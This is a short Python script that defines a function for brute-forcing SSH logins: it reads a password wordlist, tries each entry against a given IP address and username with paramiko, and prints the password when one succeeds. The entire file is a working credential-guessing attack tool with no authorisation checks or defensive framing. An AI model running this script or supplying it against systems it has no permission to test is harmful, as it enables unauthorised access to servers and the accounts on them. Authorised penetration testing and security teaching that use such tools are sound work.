import paramiko
import sys
from colorama import Fore, Back, Style

def ssh_bruteforce(ip, username, password_list):
    count = 1
    
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(Fore.YELLOW + f"[ATTEMPT {count}] [{password}]")
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(hostname=ip, username=username, password=password, timeout=3)
            print(Fore.GREEN + "\nPassword Found!")
            print(Fore.GREEN + f"IP Address: {ip}")
            print(Fore.GREEN + f"Username: {username}")
            print(Fore.GREEN + f"Password: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            # Incorrect password, move to the next attempt
            pass
        except Exception as e:
            print(Fore.RED + f"An error occurred: {e}")
            return False
        finally:
            client.close()
        
        count += 1
    
    print(Fore.RED + "Password not Found :(")
    return False
